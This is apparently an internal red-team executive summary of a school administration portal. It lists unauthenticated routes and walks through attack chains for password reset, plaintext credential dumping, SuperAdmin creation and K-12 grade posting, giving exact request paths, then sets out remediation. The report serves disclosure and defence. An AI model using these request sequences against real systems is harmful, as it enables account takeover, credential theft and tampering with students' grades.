# Admin Portal — Executive Summary
**Date:** June 9, 2026  
**Module:** Administrator / AdminAdmin Portal  
**Reviewer:** Internal Red Team  
**Risk Level:** CRITICAL

---

## Overview

The Admin portal analysis surfaced the highest concentration of unauthenticated write-access vulnerabilities found in the entire engagement. The root cause is a single architectural mistake: the `cors` middleware (`App\Http\Middleware\Cor`) adds only HTTP CORS headers — it performs zero authentication — yet it was applied to all Faculty and Staff (FNS) account-management routes. This turns the school's internal account provisioning API into a completely open endpoint reachable by any internet visitor.

Additionally, three AdminAdmin reporting routes and two K-12 grade-workflow routes were placed outside all middleware groups, making sensitive institutional data and grade manipulation accessible without credentials.

---

## Risk Summary Table

| ID | Severity | Finding | CVSS |
|---|---|---|---|
| A-01 | **CRITICAL** | Unauthenticated password reset for any user account | 9.8 |
| A-02 | **CRITICAL** | Unauthenticated plaintext password dump for all staff | 7.5 |
| A-03 | **CRITICAL** | Unauthenticated faculty/staff account creation with arbitrary user type | 7.5 |
| A-04 | **HIGH** | Unauthenticated portal privilege modification (`faspriv` table) | 8.5 |
| A-05 | **HIGH** | Unauthenticated account activation/deactivation for any staff account | 7.5 |
| A-06 | **HIGH** | K-12 grade approve/post endpoints completely unauthenticated | 8.1 |
| A-07 | **HIGH** | Unauthenticated database sync routes (insert/update/delete teacher records) | 8.1 |
| A-08 | **MEDIUM** | AdminAdmin enrollment/financial reports accessible without any middleware | 7.5 |
| BUG-A-01 | **Bug** | Suppressed JSON encoding errors in staff list endpoint | — |
| BUG-A-02 | **Bug** | Null dereference on `auth()->user()->id` in unauthenticated context | — |

**Module totals: 3 Critical, 4 High, 1 Medium, 2 Bugs**

---

## Highest-Impact Attack Chain

### Chain 1: Full System Takeover via Unauthenticated Password Reset

```
1. Enumerate admin email format (observed from existing code: <year><0001..N>)
   — or use known emails: admin@school.edu, registrar@school.edu

2. GET /administrator/setup/accounts/updatepass?tid=<target_email>
   — No auth. Resets ANY account password to "123456"
   — Response: {"status":1,"message":"Account Reset"}

3. POST /login — email=<target> password=123456
   — Authenticated as target user (Admin, Registrar, SuperAdmin, etc.)

4. Full system access achieved
```

This is a zero-credential, single-HTTP-request account takeover for any user in the system.

### Chain 2: Unauthenticated Staff Credential Harvest

```
1. GET /administrator/setup/accounts/list?length=9999&start=0&status=1
   — Returns JSON with all active teacher records
   — Each record includes: passwordstr (PLAINTEXT), password (bcrypt), tid (email)

2. Parse response — all staff credentials extracted without authentication
   — Login as any staff member
```

### Chain 3: Privilege Escalation via Account Creation

```
1. GET /administrator/setup/accounts/create/account
     ?lname=Attacker&fname=Test&utype=17&userid=1
   — Creates a new account with type=17 (SuperAdmin) if type 17 exists in usertype table
   — Response: {"status":1,"data":"Created Successfully!"}
   — New account email: <year>NNNN, password: 123456

2. POST /login — email=<generated email> password=123456
   — Logged in as SuperAdmin
```

### Chain 4: K-12 Grade Manipulation

```
1. Know or enumerate a grade record ID (gradestatusid)
2. GET /reportcard/grade/status/approve?gradestatusid=<id>
   — No auth. Approves any pending grade status.
3. GET /reportcard/grade/status/post?gradestatusid=<id>
   — No auth. Posts grades to final records.
```

---

## Business Impact

| Impact Area | Description |
|---|---|
| **Full System Compromise** | Any internet visitor can become SuperAdmin via Chain 1 or Chain 3 in under 60 seconds |
| **Mass Credential Exposure** | All faculty/staff plaintext passwords exposed via a single unauthenticated GET request |
| **Academic Integrity** | K-12 report card grades can be approved or finalized without authorization |
| **Institutional Data Exposure** | School-wide enrollment and cash transaction data exposed without auth |
| **Operational Disruption** | All staff accounts can be mass-deactivated via `update_active`, locking out the institution |
| **Regulatory/Compliance** | Philippine Data Privacy Act (RA 10173) breach — mass exposure of employee credentials and student data |

---

## Remediation Priority

**Week 1 (Immediate):**
1. Remove or disable `GET /administrator/setup/accounts/updatepass` — this is a system-wide backdoor  
2. Remove `passwordstr` from the `list()` SELECT query — plaintext passwords must not be transmitted  
3. Replace `['cors']` with `['auth', 'isAdmin:admin']` for ALL account-management routes  
4. Add `['auth', 'isSuperAdmin:principal']` to grade approve/post routes  

**Week 2:**
5. Move `GET /studentmasterlist`, `GET /cashtransaction`, `GET /targetcollection` inside the `['auth', 'isAdminAdmin']` group  
6. Audit all `faspriv` records for unauthorized portal privilege grants  
7. Force password reset for all staff accounts (A-01 may have already been exploited)  
8. Review the `cors` middleware in all other route groups across the entire codebase  

---

*End of Admin Portal Executive Summary*
